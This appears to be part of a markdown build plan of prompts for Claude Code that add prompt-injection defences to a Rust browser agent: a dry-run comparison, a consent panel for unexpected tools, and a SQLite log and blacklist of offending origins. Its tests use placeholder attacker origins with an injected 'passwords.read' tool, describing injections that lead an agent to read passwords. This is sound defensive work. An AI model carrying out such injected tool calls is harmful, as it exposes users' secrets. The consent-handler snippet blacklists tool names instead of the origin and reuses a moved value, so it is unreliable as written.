+Prompt for Claude Code:
+```
+In crates/ferrite-ui/src/lib.rs:
+
+1. Add to crates/ferrite-ui/Cargo.toml:
+   ferrite-ipi = { path = "../ferrite-ipi" }
+
+2. Add to FerriteBrowser state:
+   - pending_diff: Option<ferrite_ipi::comparator::FingerprintDiff>
+   - pending_decision: ferrite_ipi::comparator::ConsentDecision (default)
+   - approved_extras: std::collections::HashSet<ferrite_ipi::tool_decision::ToolId>
+
+3. Add to FerriteBrowserMessage:
+   - ConsentRequired(ferrite_ipi::comparator::FingerprintDiff)
+   - ApproveTool(String)
+   - RejectTool(String)
+   - ConsentSubmitted
+   - ConsentCancelled
+
+4. Add to update():
+   - ConsentRequired(diff):
+     pending_diff = Some(diff); pending_decision = Default::default();
+     agent_is_running = false.
+   - ApproveTool(id):
+     pending_decision.approve(ferrite_ipi::tool_decision::ToolId::new(&id)).
+   - RejectTool(id):
+     pending_decision.reject(ferrite_ipi::tool_decision::ToolId::new(&id)).
+   - ConsentSubmitted:
+     approved_extras = pending_decision.approved.clone().
+     Clear pending_diff and pending_decision.
+     Resume agent real run (spawn task, same as AgentTaskSubmitted but now
+     BrowserToolExecutor is wrapped: if executor is asked to call a rejected
+     tool, return AgentToolResult::err(call.call_id, "blocked by user consent")).
+   - ConsentCancelled:
+     Clear pending_diff and pending_decision.
+     agent_is_running = false.
+
+5. Modify AgentTaskSubmitted to run the IPI dry run FIRST:
+   Before spawning the real agent task:
+   a. Create ToolDecisionEngine::new() and call fingerprint_from_task(&task).
+   b. Create DryRunOrchestrator::new(twin_path) and call run(&task, &[], &agent).
+   c. Call compare(&fingerprint, &dry_run_record).
+   d. If diff.is_clean(): proceed to real agent run immediately.
+   e. If not clean: send ConsentRequired(diff) and return — wait for user.
+   The dry run must run asynchronously (in the same tokio task) before the
+   real run starts. Send AgentToolLogged("[dry run complete — checking for
+   unexpected activity]") while it runs.
+
+6. In view(), inside the agent sidebar:
+   When pending_diff is Some, render the consent panel INSTEAD of the
+   tool log and response box:
+
+   Amber-tinted container (use palette.danger.base.color with 0.08 alpha background):
+
+   Row: Text "! Unexpected Activity Detected" (size 14, bold, danger colour).
+
+   Text(diff.summary()) (size 12, wrapped, secondary colour).
+
+   Separator.
+
+   Text "Review each item:" (size 12, bold).
+
+   For each tool in diff.extra_tools (sorted alphabetically):
+     Row:
+       Text(tool_id.to_string()) (size 12, fills width)
+       [Approve] button -> ApproveTool(tool_id.to_string())    green tint
+       [Reject]  button -> RejectTool(tool_id.to_string())     red tint
+       Visual: button highlighted if already decided.
+
+   Separator.
+
+   [Proceed with approved] button -> ConsentSubmitted.
+     Disabled until pending_decision.is_complete(&diff).
+
+   [Cancel] button -> ConsentCancelled.
+```
+Exit condition: `cargo run -p ferrite-shell ui`. With `FERRITE_GEMINI_API_KEY` set, submit a task. Dry run executes silently. If clean, real run starts immediately. If not, the consent panel appears with Approve/Reject per extra tool. After all decisions, "Proceed" starts the real run; rejected tools are blocked and logged. "Cancel" returns to idle state.
+
+## Task 18: IPI — Dataset Pipeline (`ferrite-ipi::dataset`)
+### Block 1: IPI event database, origin blacklist, and CSV export
+What it does: Creates the SQLite database for storing confirmed IPI events (true positives) and false positives. Maintains a persistent origin blacklist. Provides CSV export for research use. Automatically records an `IpiEvent` when the user submits consent — true positive if any tool was rejected, false positive if all were approved.
+
+Prompt for Claude Code:
+```
+Add to crates/ferrite-ipi/Cargo.toml:
+rusqlite = { version = "0.31", features = ["bundled"] }
+serde_json = "1"
+
+In crates/ferrite-ipi/src/dataset/mod.rs implement:
+
+use rusqlite::{Connection, params};
+use crate::comparator::{IpiEvent, IpiLabel};
+
+pub struct IpiDatabase { conn: Connection }
+
+impl IpiDatabase {
+    pub fn new(path: &str) -> Result<Self, String> {
+        let conn = Connection::open(path).map_err(|e| e.to_string())?;
+        conn.execute_batch("
+            CREATE TABLE IF NOT EXISTS ipi_events (
+                event_id TEXT PRIMARY KEY,
+                detected_at TEXT NOT NULL,
+                origin TEXT NOT NULL,
+                payload_hash TEXT NOT NULL,
+                extra_tools TEXT NOT NULL,
+                task_context_hash TEXT NOT NULL,
+                label TEXT NOT NULL
+            );
+            CREATE TABLE IF NOT EXISTS origin_blacklist (
+                origin TEXT PRIMARY KEY,
+                blacklisted_at TEXT NOT NULL,
+                event_count INTEGER DEFAULT 1
+            );
+        ").map_err(|e| e.to_string())?;
+        Ok(Self { conn })
+    }
+
+    pub fn insert_event(&self, event: &IpiEvent) -> Result<(), String> {
+        let tools_json = serde_json::to_string(&event.extra_tools).unwrap_or_default();
+        let label = match event.label {
+            IpiLabel::TruePositive  => "TruePositive",
+            IpiLabel::FalsePositive => "FalsePositive",
+        };
+        self.conn.execute(
+            "INSERT OR REPLACE INTO ipi_events
+             (event_id, detected_at, origin, payload_hash, extra_tools, task_context_hash, label)
+             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
+            params![
+                event.event_id.to_string(),
+                event.detected_at.to_rfc3339(),
+                event.origin, event.payload_hash, tools_json,
+                event.task_context_hash, label,
+            ],
+        ).map_err(|e| e.to_string())?;
+        Ok(())
+    }
+
+    pub fn blacklist_origin(&self, origin: &str) -> Result<(), String> {
+        self.conn.execute(
+            "INSERT INTO origin_blacklist (origin, blacklisted_at)
+             VALUES (?1, ?2)
+             ON CONFLICT(origin) DO UPDATE SET event_count = event_count + 1",
+            params![origin, chrono::Utc::now().to_rfc3339()],
+        ).map_err(|e| e.to_string())?;
+        Ok(())
+    }
+
+    pub fn is_blacklisted(&self, origin: &str) -> bool {
+        self.conn.query_row(
+            "SELECT COUNT(*) FROM origin_blacklist WHERE origin = ?1",
+            params![origin],
+            |row| row.get::<_, i64>(0),
+        ).unwrap_or(0) > 0
+    }
+
+    pub fn export_csv(&self) -> Result<String, String> {
+        let mut stmt = self.conn.prepare(
+            "SELECT event_id, detected_at, origin, payload_hash,
+                    extra_tools, task_context_hash, label
+             FROM ipi_events ORDER BY detected_at DESC"
+        ).map_err(|e| e.to_string())?;
+        let mut csv = "event_id,detected_at,origin,payload_hash,extra_tools,task_context_hash,label\n".to_string();
+        let rows = stmt.query_map([], |row| {
+            Ok(( row.get::<_,String>(0)?, row.get::<_,String>(1)?,
+                 row.get::<_,String>(2)?, row.get::<_,String>(3)?,
+                 row.get::<_,String>(4)?, row.get::<_,String>(5)?,
+                 row.get::<_,String>(6)? ))
+        }).map_err(|e| e.to_string())?;
+        for row in rows {
+            let (id,at,origin,hash,tools,ctx,label) = row.map_err(|e| e.to_string())?;
+            csv.push_str(&format!(
+                "\"{}\",\"{}\",\"{}\",\"{}\",\"{}\",\"{}\",\"{}\"\n",
+                id,at,origin,hash,tools,ctx,label
+            ));
+        }
+        Ok(csv)
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::comparator::IpiEvent;
+
+    fn make_event(label: IpiLabel) -> IpiEvent {
+        IpiEvent {
+            event_id: uuid::Uuid::new_v4(),
+            detected_at: chrono::Utc::now(),
+            origin: "https://attacker.com".to_string(),
+            payload_hash: "abc123".to_string(),
+            extra_tools: vec!["passwords.read".to_string()],
+            task_context_hash: "def456".to_string(),
+            label,
+        }
+    }
+
+    #[test]
+    fn insert_and_export() {
+        let path = format!("/tmp/ferrite-ipi-test-{}.db", uuid::Uuid::new_v4());
+        let db = IpiDatabase::new(&path).unwrap();
+        db.insert_event(&make_event(IpiLabel::TruePositive)).unwrap();
+        let csv = db.export_csv().unwrap();
+        assert!(csv.contains("TruePositive"));
+        assert!(csv.contains("attacker.com"));
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn blacklist_origin() {
+        let path = format!("/tmp/ferrite-ipi-bl-{}.db", uuid::Uuid::new_v4());
+        let db = IpiDatabase::new(&path).unwrap();
+        assert!(!db.is_blacklisted("https://evil.com"));
+        db.blacklist_origin("https://evil.com").unwrap();
+        assert!(db.is_blacklisted("https://evil.com"));
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn false_positive_label_stored_correctly() {
+        let path = format!("/tmp/ferrite-ipi-fp-{}.db", uuid::Uuid::new_v4());
+        let db = IpiDatabase::new(&path).unwrap();
+        db.insert_event(&make_event(IpiLabel::FalsePositive)).unwrap();
+        let csv = db.export_csv().unwrap();
+        assert!(csv.contains("FalsePositive"));
+        let _ = std::fs::remove_file(path);
+    }
+}
+```
+
+Additionally, in crates/ferrite-ui/src/lib.rs, wire automatic event recording into the ConsentSubmitted handler:
+
+use ferrite_ipi::dataset::IpiDatabase;
+use ferrite_ipi::comparator::{IpiEvent, IpiLabel};
+use ferrite_ipi::sanitizer::sha256_hex;
+
+After taking the consent decision:
+  let label = if pending_decision.rejected.is_empty() {
+      IpiLabel::FalsePositive
+  } else {
+      IpiLabel::TruePositive
+  };
+  let event = IpiEvent {
+      event_id: uuid::Uuid::new_v4(),
+      detected_at: chrono::Utc::now(),
+      origin: tab_urls[active_tab].clone(),
+      payload_hash: "none".to_string(),  // filled in by sanitizer in future
+      extra_tools: diff.extra_tools.iter().map(|t| t.to_string()).collect(),
+      task_context_hash: sha256_hex(agent_task_input.as_bytes()),
+      label,
+  };
+  let db_path = std::env::temp_dir().join("ferrite_ipi.db");
+  if let Ok(db) = IpiDatabase::new(db_path.to_str().unwrap_or("")) {
+      let _ = db.insert_event(&event);
+      if label == IpiLabel::TruePositive {
+          for t in &diff.extra_tools {
+              let _ = db.blacklist_origin(&t.to_string());
+          }
+      }
+  }
+Exit condition: `cargo test -p ferrite-ipi` — all three dataset tests pass. After a consent interaction in the running browser, `ferrite_ipi.db` in the system temp dir contains a row. CSV export shows the event with the correct label.
 ### Block 1: `ferrite-ipi` crate skeleton + `ToolId` and `ToolFingerprint` types
 What it does: Creates the new `ferrite-ipi` crate with its module structure and the core types used by every subsequent block. No logic yet — just proves the crate compiles and the types are correct.
 
